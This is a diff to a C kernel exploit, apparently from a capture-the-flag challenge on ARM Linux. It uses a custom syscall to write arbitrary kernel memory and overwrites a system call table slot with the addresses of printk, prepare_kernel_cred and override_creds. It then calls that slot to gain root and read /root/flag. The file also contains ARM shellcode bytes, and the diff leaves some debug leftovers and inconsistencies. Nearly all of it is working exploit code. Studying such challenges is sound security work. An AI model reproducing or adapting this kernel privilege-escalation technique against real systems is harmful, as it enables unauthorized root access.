@@ -6,6 +6,8 @@
 #include <sys/syscall.h>
 #include <fcntl.h>
 #include <sched.h>
+#include <pthread.h>
+#include <sys/types.h>
 
 #define SYS_CALL_TABLE 0x8000e348
 #define NR_SYS_UNUSED 223
@@ -17,6 +19,10 @@
 #define text_start 0x80008000
 #define SyS_execve 0x800c4bb0
 #define sys_unlink 0x800cbf9c
+#define sys_link_offset 36 // 9*4=36
+#define memcpy 0x8018fbe0
+#define sys_upper_offset 892 // 223*4=892
+
 /*
 #define do_symlink 0x80488064
 #define prepare_kernel_cred 0x8003f924
@@ -81,7 +87,7 @@ char * SC = 	"\x01\x60\x8f\xe2"
 			"\x6f\x72"
 			"\x67\x0a";
 */
-/*
+
 char *SC = "\x01\x60\x8f\xe2"    // add  r6, pc, #1
                   "\x16\xff\x2f\xe1"    // bx   r6
                   "\x78\x46"            // mov  r0, pc
@@ -98,7 +104,7 @@ char *SC = "\x01\x60\x8f\xe2"    // add  r6, pc, #1
                   "\x74\x2f\x70\x77"    // .word    0x77702f74
                   "\x65\x63"            // .short   0x656e
                   "\x64";               // .byte    0x64
-*/
+
 /*
 char *SC = "\x01\x60\x8f\xe2"    // add  r6, pc, #1
                   "\x16\xff\x2f\xe1"    // bx   r6
@@ -172,15 +178,26 @@ repeat:
 }
 
 typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
+typedef int __attribute__((regparm(3))) (* _override_creds)(unsigned long cred);
 typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
+typedef int __attribute__((regparm(3))) (* _printk)(const char * message);
+typedef unsigned long  __attribute__((regparm(3))) (* _cred_alloc_blank)(void);
+
 _commit_creds commit_creds;
+_override_creds override_creds;
 _prepare_kernel_cred prepare_kernel_cred;
+_printk printk;
+_cred_alloc_blank cred_alloc_blank;
+
+void test();
 
 int main()
 {
-	unsigned int * info = (unsigned int *)malloc(sizeof(unsigned int *));
+    //unsigned int * test_a = (unsigned int *)malloc(400);
+	//unsigned int * info = (unsigned int *)malloc(400);
     int i = 0;
-    printf("[*] Addr of info: %p\n", info);
+    unsigned int * temp;
+    //printf("[*] Addr of info: %p\n", info);
     
     /*
     char * payload = (char *)malloc(strlen(SC));
@@ -192,42 +209,100 @@ int main()
     
     // Write to bss the shellcode
     syscall(223, payload, (char *)(unsigned int *)bss_start);
+    info[0] = (unsigned int *)bss_start;
+    syscall(223, (char *)info, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!
+*/
 
-    // Check if written correctly
-    syscall(223, (char *)(unsigned int *)bss_start ,payload);
-    int fd = open("/tmp/out", O_WRONLY);
-    printf("sizeof_payload: %d \n", sizeof_payload);
-    write(fd, &payload, sizeof_payload);
-    */
-
-    // Write address of prepare_kernel_cred
-    prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");
-    info[0] = prepare_kernel_cred;
+   // Write address of printk to test kernel code exec
+    printk = (_printk) get_kernel_sym("printk");
+    /*info[0] = printk;
     printf("[*] info[0]: %p \n", info[0]);
     syscall(223, (char *)info, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!
+    */
+    temp = printk;
+    printf("[*] temp: %p \n", temp);
+    syscall(223, (char *)&temp, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!
+
+    // check write
+    /*
+    syscall(223, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (char *)info); 
+    printf("[*] check write printk: info[0]: %p \n", info[0]);
+*/
+    syscall(7, "[!] Got kernel code exec\n");
+
+    temp = &test;
+    printf("[*] temp: %p \n", temp);
+    syscall(223, (char *)&temp, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!
+    syscall(223, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (char *)&temp); 
+    printf("[*] check write test: temp: %p \n", temp);
+    syscall(7);
+/*
+    // 1 where uid will be (sys_link)
+    temp = 1;
+    printf("[*] temp: %p \n", temp);
+    syscall(223, (char *)&temp, (char *)(unsigned int *)(SYS_CALL_TABLE+sys_link_offset)); // override!
+*/
+    // Write address of prepare_kernel_cred
+    prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");
+    temp = prepare_kernel_cred;
+    printf("[*] temp: %p \n", temp);
+    syscall(223, (char *)&temp, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!
     //commit_creds(prepare_kernel_cred(0));
     
     // check write
-    syscall(223, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (char *)info); 
-    printf("[*] check write prepare_kernel_cred: info[0]: %p \n", info[0]);
+    syscall(223, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (char *)&temp); 
+    printf("[*] check write prepare_kernel_cred: temp: %p \n", temp);
 
     struct task_struct * kernel_cred;
-    kernel_cred = syscall(7, 0);
+    kernel_cred = syscall(7, 0, 0, 0);
     printf("[*] kernel_cred: %p \n", kernel_cred);
-
-    //Write address of commit_creds
-    commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
-    info[0] = commit_creds;
-    printf("[*] info[0]: %p \n", info[0]);
-    syscall(223, (char *)info, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!
+    //printf("[*] kernel_cred pid %d \n", kernel_cred->thread_temp);
+    //printf("[*] kernel_cred uid %d \n", (* kernel_cred).uid);
+    
+    /*
+    // Write address of cred_alloc_blank
+    cred_alloc_blank = (_cred_alloc_blank) get_kernel_sym("cred_alloc_blank");
+    temp[0] = cred_alloc_blank;
+    printf("[*] temp[0]: %p \n", temp[0]);
+    syscall(223, (char *)temp, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!
 
     // check write
-    syscall(223, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (char *)info); 
-    printf("[*] check write commit_creds info[0]: %p \n", info[0]);
+    syscall(223, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (char *)temp); 
+    printf("[*] check write cred_alloc_blank: temp[0]: %p \n", temp[0]);
 
+    struct task_struct * kernel_cred;
+    free(temp);
+    kernel_cred = syscall(7, 0);
+    unsigned int * temp = (unsigned int *)malloc(400);
+    printf("[*] kernel_cred: %p \n", kernel_cred);
+    */
+   
+    //Write address of override_creds
+    override_creds = (_override_creds) get_kernel_sym("override_creds");
+    temp = override_creds;
+    printf("[*] temp: %p \n", temp);
+    syscall(223, (char *)&temp, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!
 
-    syscall(7, &kernel_cred);
+    // check write
+    syscall(223, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (char *)&temp); 
+    printf("[*] check write override_creds temp: %p \n", &temp);
     
+    struct task_struct * old_cred;
+    old_cred = syscall(7, &kernel_cred);
+    printf("[*] Old kcred: %p \n", old_cred);
+/*
+    //Write address of commit_creds
+    commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
+    temp[0] = commit_creds+0xF;
+    printf("[*] temp[0]: %p \n", temp[0]);
+    syscall(223, (char *)temp, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7)); // override!
+
+    // check write
+    syscall(223, (char *)(unsigned int *)(SYS_CALL_TABLE+pc_offset_7), (char *)temp); 
+    printf("[*] check write commit_creds temp[0]: %p \n", info[0]);
+*/
+    syscall(7, &kernel_cred, &kernel_cred, &kernel_cred);
+
     printf("uid: %d \n", getuid());
 
     if(getuid()) {
@@ -236,12 +311,7 @@ int main()
     else{
         printf("Pwned?\n");
     }
-
     FILE *f = fopen("/root/flag", O_RDONLY);
     fprintf(stdout, f);
-    /*
-    // Print commit_creds?
-    syscall(223, commit_creds, (char *)info);
-    printf("commit_creds?: %x \n", &info);
-    */
 }
+
